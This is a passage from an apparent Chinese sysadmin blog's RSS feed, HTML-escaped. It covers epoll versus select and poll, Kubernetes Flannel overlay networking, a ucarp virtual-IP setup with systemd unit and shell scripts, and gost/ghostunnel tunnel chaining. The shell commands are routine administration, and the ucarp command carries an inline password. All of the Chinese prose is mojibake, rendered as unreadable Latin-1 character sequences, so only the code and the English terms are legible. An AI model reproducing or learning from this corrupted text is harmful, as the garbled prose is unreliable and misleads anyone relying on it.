&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®åœ¨æ˜¯æ±—é¢œå•Šï¼Œæ‰€ä»¥å¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹è¿™ä¸ª epollã€‚&lt;/p&gt;
&lt;h4 id=&#34;é¦–å…ˆæ‰”æ¦‚å¿µ&#34;&gt;é¦–å…ˆæ‰”æ¦‚å¿µ&lt;/h4&gt;
&lt;h4 id=&#34;ioå¤šè·¯å¤ç”¨&#34;&gt;IOå¤šè·¯å¤ç”¨ï¼š&lt;/h4&gt;
&lt;p&gt;å¤šè·¯æ˜¯æŒ‡ç½‘ç»œè¿æ¥ï¼Œå¤ç”¨æŒ‡çš„æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;IOå¤šè·¯å¤ç”¨æ˜¯ä¸€ç§åŒæ­¥IOæ¨¡å‹ï¼Œå®ç°ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼›&lt;/p&gt;
&lt;p&gt;ä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯è¯»å°±ç»ªæˆ–è€…å†™å°±ç»ªï¼‰ï¼Œå°±èƒ½å¤Ÿé€šçŸ¥åº”ç”¨ç¨‹åºè¿›è¡Œç›¸åº”çš„è¯»å†™æ“ä½œï¼›&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰æ–‡ä»¶æè¿°ç¬¦å°±ç»ªæ—¶ä¼šé˜»å¡åº”ç”¨ç¨‹åºï¼Œäº¤å‡ºcpuã€‚&lt;/p&gt;
&lt;h4 id=&#34;é‚£ä¹ˆioå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§-selectpollepoll&#34;&gt;é‚£ä¹ˆIOå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§ï¼š selectã€pollã€epoll&lt;/h4&gt;
&lt;p&gt;selectã€pollã€epollæœ¬è´¨ä¸Šéƒ½æ˜¯åŒæ­¥I/Oï¼Œç”¨æˆ·è¿›ç¨‹ï¼ˆè¿™é‡Œå°±æ˜¯Nginxï¼‰è´Ÿè´£è¯»å†™ï¼ˆä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè¯»å†™è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;selectï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æŸ¥è¯¢ fd_set ä¸­ï¼Œæ˜¯å¦æœ‰å°±ç»ªçš„ fdï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå½“æœ‰ fd (File descripter) å°±ç»ªæˆ–è¶…æ—¶è¿”å›ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fd_set æ˜¯ä¸€ä¸ªä½é›†åˆï¼Œå¤§å°æ˜¯åœ¨ç¼–è¯‘å†…æ ¸æ—¶çš„å¸¸é‡ï¼Œé»˜è®¤å¤§å°ä¸º 1024&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è¿æ¥æ•°é™åˆ¶ï¼Œfd_set å¯è¡¨ç¤ºçš„ fd æ•°é‡å¤ªå°äº†ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;çº¿æ€§æ‰«æï¼šåˆ¤æ–­ fd æ˜¯å¦å°±ç»ªï¼Œéœ€è¦éå†ä¸€è¾¹ fd_setï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;pollï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;è§£å†³äº†è¿æ¥æ•°é™åˆ¶ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;poll ä¸­å°† select ä¸­çš„ fd_set æ›¿æ¢æˆäº†ä¸€ä¸ª pollfd æ•°ç»„&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è§£å†³ fd æ•°é‡è¿‡å°çš„é—®é¢˜&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;epollï¼ševent äº‹ä»¶é©±åŠ¨&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;äº‹ä»¶æœºåˆ¶ï¼šé¿å…çº¿æ€§æ‰«æ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸ºæ¯ä¸ª fdï¼Œæ³¨å†Œä¸€ä¸ªç›‘å¬äº‹ä»¶&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fd å˜æ›´ä¸ºå°±ç»ªæ—¶ï¼Œå°† fd æ·»åŠ åˆ°å°±ç»ªé“¾è¡¨&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetesä¸‹Flannelç½‘ç»œ</title>
      <link>https://rendoumi.com/posts/20220317-kubernetes_flannel/</link>
      <pubDate>Thu, 17 Mar 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220317-kubernetes_flannel/</guid>
      <description>&lt;p&gt;ç°åœ¨å„å¤§å…¬æœ‰äº‘çš„ k8s ç½‘ç»œæ’ä»¶åŸºæœ¬ç”¨çš„éƒ½æ˜¯ vxlanï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è¿™ä¸ªè¿›è¡Œä¸€ä¸‹è¯¦ç»†äº†è§£ï¼Œä»¥ä¾¿ç”¨äºå…¬å¸çš„æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€åŸç†&#34;&gt;ä¸€ã€åŸç†&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆï¼Œkubernetesçš„ç½‘ç»œæ¨¡å‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220317101247744&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220317-kubernetes_flannel/image-20220317101247744.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŒ…å«ä¸‰è¦ç´ ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ‰€æœ‰çš„å®¹å™¨(container)ä¹‹é—´èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹äº’ç›¸é€šè®¯&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰€æœ‰çš„èŠ‚ç‚¹(Node)èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹è·Ÿæ‰€æœ‰çš„å®¹å™¨(container)äº’ç›¸é€šè®¯ï¼ˆåä¹‹å®¹å™¨è®¿é—®èŠ‚ç‚¹äº¦ç„¶ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å®¹å™¨(container)ä¸­çš„IPåœ°å€ï¼Œåœ¨å®¹å™¨å†…å’Œå®¹å™¨å¤–é¢çœ‹èµ·æ¥æ˜¯ä¸€æ ·çš„&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£æ¥åˆ° flannelï¼Œå®ƒæ˜¯ä¸€ç§ Overlay network è¦†ç›–ç½‘ç»œï¼Œç›–åœ¨åŸæœ‰çš„ Node ç½‘ç»œåŸºç¡€ä¸Šï¼š
&lt;img alt=&#34;image-20220317101802355&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220317-kubernetes_flannel/image-20220317101802355.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šå›¾è¦ä»”ç»†åˆ†æï¼Œ K8S ä¸­å­˜åœ¨ä¸‰ä¸ª+ä¸€ä¸ªç½‘ç»œæ®µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;node ç½‘ç»œæ®µï¼Œä¸Šå›¾æ˜¯ 172.20.32.0/19ï¼Œè¿™æ˜¯åŸºç¡€ç½‘ç»œæ®µ&lt;/li&gt;
&lt;li&gt;pod ç½‘ç»œæ®µï¼Œ100.96.0.0/16ï¼Œ2Â¹â¶(65536)ä¸ªIPï¼Œè¿™æ˜¯ç”± flannel äº§ç”Ÿçš„ overlay networkï¼Œæ‰€æœ‰çš„ pod éƒ½ç«™åœ¨ä¸€ä¸ªå¤§å¹¿åœºä¸Šï¼Œäº’ç›¸å¯è§&lt;/li&gt;
&lt;li&gt;svc ç½‘ç»œæ®µï¼Œä¸Šå›¾æœªæï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œæƒ³è¦æŠŠ pod çš„ ip ç»™å›ºå®šä¸‹æ¥ï¼Œå°±å¾—ä½¿ç”¨ svc æ¥åˆ†é…å›ºå®šçš„åŸŸåï¼Œè¿™ä¸ªæ˜¯ç”± iptables æ¥ç»´æŠ¤çš„&lt;/li&gt;
&lt;li&gt;In-Host docker networkç½‘ç»œæ®µï¼Œè¿™æ˜¯æ¯ä¸ª Node ä¸»æœºçš„å•ç‹¬ç½‘ç»œæ®µï¼Œflannelç»™æ¯ä¸ª Node ä¸»æœºåˆ’åˆ†äº†ä¸€ä¸ª 100.96.x.0/24 æ®µï¼Œç„¶ååœ¨ etcd å†…è¿›è¡Œç»´æŠ¤ï¼Œæ¥é¿å…ä¸åŒçš„ Node ä¸»æœºåˆ†é…IPå†²çªã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»¼è¿°ï¼šflannel ä¸ºæ¯ä¸ª Node åˆ†é…ä¸€ä¸ª subnetï¼Œå®¹å™¨(container)ä»æ­¤ subnet ä¸­åˆ†é… IPï¼Œè¿™äº› IP å¯ä»¥åœ¨ Node é—´è·¯ç”±ï¼Œå®¹å™¨é—´æ— éœ€ NAT å’Œ port mapping å°±å¯ä»¥è·¨ä¸»æœºé€šä¿¡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ucarpçš„å®‰è£…é…ç½®</title>
      <link>https://rendoumi.com/posts/20220225-ucarp/</link>
      <pubDate>Fri, 25 Feb 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220225-ucarp/</guid>
      <description>&lt;p&gt;æœ‰ V2EX çš„å›å‹é—®åˆ°å¦‚ä½•é™æ€ç¼–è¯‘ keepalived çš„é—®é¢˜ï¼Œå®é™…ä¸Š keepalived ç¡®å®é…ç½®æ¯”è¾ƒéº»çƒ¦ã€‚é‚£è¿˜æœ‰ä¸€ä¸ªç®€å•æ˜“è¡Œçš„ ucarpï¼Œç”Ÿäº§ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªã€‚&lt;/p&gt;
&lt;p&gt;ucarp è·Ÿ keepalived ä¸€æ ·ï¼Œéƒ½æ˜¯ç”¨äºé«˜å¯ç”¨çš„ IP æ¼‚ç§»&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æ¯” keepalived é…ç½®ç®€å•ï¼Œè€Œä¸” opnsense å°±æ˜¯ç”¨çš„è¿™ä¸ªåšçš„é«˜å¯ç”¨ï¼Œopnsense æ˜¯ä¸ªéå¸¸å¯é çš„é˜²ç«å¢™è½¯ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæœ‰ä¸¤å°è™šæœºï¼Œ172.18.19.1å’Œ172.18.19.2ï¼Œè™šæ‹Ÿipæ˜¯172.18.19.3&lt;/p&gt;
&lt;p&gt;å…ˆé…ç½®172.18.19.1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install psmisc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install ucarp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /etc/systemd/system/ucarp.service
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Description=UCARP virtual interface
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;After=network.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Type=simple
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStart=/usr/local/bin/ucarp.sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;RemainAfterExit=true
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStop=/usr/bin/killall -SIGTERM ucarp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStop=/bin/sleep 10
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;TimeoutStopSec=30
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;StandardOutput=journal
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬çš„systemdæ˜¯ç›´æ¥è°ƒç”¨äº†ucarp.shæ¥å¯åŠ¨ï¼Œè¿™æ ·æ›´ç®€å•ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä¸‰ä¸ªè„šæœ¬ï¼Œæ³¨æ„æƒé™æ˜¯755
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /usr/local/bin/ucarp.sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/bin/bash&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /usr/local/bin/vip-up.sh 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/sbin/ip addr add ${2}/24 dev ${1}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/sbin/ip neigh flush dev ${1}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /usr/local/bin/vip-down.sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/sbin/ip addr del ${2}/24 dev ${1}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/usr/sbin/arp -d ${2}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œç¬¬ä¸€å°æœºå™¨å°±é…ç½®å¥½äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>gost tunnelçš„ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20220224-gost_tunnel/</link>
      <pubDate>Thu, 24 Feb 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220224-gost_tunnel/</guid>
      <description>&lt;p&gt;ç”¨è¿‡äº†å¥½å‡ ä¸ª tunnel å·¥å…·è½¯ä»¶ï¼Œå„æœ‰é•¿å¤„ã€‚&lt;/p&gt;
&lt;p&gt;ghostunnel æ˜¯æ”¯æŒè‡ªå®šä¹‰ tls è¯ä¹¦åŠ å¯†çš„ï¼Œè¿™å›ç”¨ä¸ªæ›´å‰å®³çš„ï¼Œæ”¯æŒå„ç§ä»£ç†é“¾æ¡çš„ï¼Œgost&lt;/p&gt;
&lt;p&gt;é¡¹ç›®åœ°å€ï¼šhttps://github.com/ginuerzh/gost&lt;/p&gt;
&lt;p&gt;é‡Œé¢çš„æ¦‚å¿µæœ‰ç‚¹æ„æ€ï¼Œå…¶å®å°±ä¸¤æ¡ï¼Œ-L æœ¬åœ°ç›‘å¬ï¼Œ-F é“¾æ¡è½¬å‘ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„çš„å°±ä¸€ç‚¹ï¼Œ-F çš„æ—¶å€™å®é™…æ˜¯ä¸€ä¸ªä¸­è½¬æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­è½¬æœåŠ¡å™¨è¦è½¬å‘çš„è§„åˆ™éœ€è¦åœ¨ -L å‚æ•°é‡ŒæŒ‡å®šã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆä¸¾ä¸ªå…·ä½“çš„ä¾‹å­ï¼š&lt;/p&gt;
&lt;p&gt;ä¸­è½¬æœåŠ¡å™¨å¼€äº†ä¸€ä¸ªæ˜æ–‡ç«¯å£ 9999ï¼Œè¿™ä¸ªç«¯å£è·‘çš„æ˜¯ ghostunnel clientï¼ŒåŠ å¯†æ•°æ®åä¼ åˆ°å¦å¤–ä¸€ä¸ªghostunnel serveræœåŠ¡å™¨ï¼Œç„¶åæ•°æ®æ˜æ–‡ç©¿å‡ºï¼Œè®¿é—®å…·ä½“çš„ç›®çš„ç½‘ç«™çš„ç«¯å£ã€‚&lt;/p&gt;
&lt;p&gt;å®¢æˆ·ç«¯çš„æœåŠ¡å™¨å‘¢æ— å¤–ç½‘è®¿é—®æƒé™ï¼Œéœ€è¦è®¿é—®ä¸­è½¬æœåŠ¡å™¨ 192.168.1.1 çš„ 9999 ç«¯å£ï¼Œç„¶åæ•°æ®é€šè¿‡ ghostunnel åŠ å¯†ç©¿å‡ºåˆ°å¤–ç½‘ã€‚&lt;/p&gt;
&lt;p&gt;ä¸­è½¬æœåŠ¡å™¨é…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ghostunnel ç›‘å¬æœ¬åœ°ç¯å›åœ°å€çš„9999ç«¯å£ï¼ŒTLS åŠ å¯†ç©¿è¶Šåˆ°å¤–ç½‘110.114.5.19:9999ï¼Œç„¶åæ ¹æ®å¤–ç½‘ server é‡Œé¢çš„é…ç½®ï¼Œåˆ°è¾¾æœ€ç»ˆç›®çš„åœ° ip å’Œ ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# gost ç›‘å¬æœ¬åœ°ç½‘å¡192.168.1.1çš„9999ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gost-linux-amd64-2.11.1 -L&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls://192.168.1.1:9999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®¢æˆ·ç«¯é…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gost-linux-amd64-2.11.1 -L&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tcp://localhost:9999/localhost:9999 -F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tls://192.168.1.1:9999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å®¢æˆ·ç«¯çš„ç¨‹åºï¼Œåªè¦è¿æ¥ localhost:9999 çš„ tcp ç«¯å£ï¼Œå°±å¯ä»¥æ¥åŠ›ä¸­è½¬æœåŠ¡å™¨ç©¿å‡ºå»äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šé¢çš„é…ç½®éå¸¸æ€ªå¼‚å§ï¼Œä»”ç»†è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸­è½¬æœåŠ¡å™¨å‘¢æœ‰ä¸¤ä¸ªåœ°å€ï¼Œlocalhostçš„ç¯å›åœ°å€ï¼Œä»¥åŠæœ¬åœ°ç½‘å¡192.168.1.1&lt;/p&gt;
&lt;p&gt;localhost:9999 æ˜¯ç”¨ ghostunnel åŠ å¯† tcp æµé‡ï¼Œtls ç©¿åˆ°å¤–ç½‘ 110.114.5.19 çš„ 9999 ç«¯å£ï¼Œç„¶åå¤–ç½‘å†è½¬å‘ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVMä¸‹å®¿ä¸»æœºçš„ç›®å½•ç›´é€šåˆ°è™šæœº</title>
      <link>https://rendoumi.com/posts/20220223-kvm_passthrouth/</link>
      <pubDate>Wed, 23 Feb 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220223-kvm_passthrouth/</guid>
      <description>&lt;p&gt;è¿™ä¸ªéœ€æ±‚ä¹Ÿå¾ˆæœ‰ç‚¹æ„æ€ï¼ŒDBA è¦æ±‚åš MySQL çš„å¸è½½ä»åº“ï¼Œæ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œç¡¬ç›˜ç©ºé—´åæœŸéœ€è¦æ‰©å®¹ï¼Œä½†æ˜¯ cpu åå€’å çš„ä¸å¤šã€‚&lt;/p&gt;
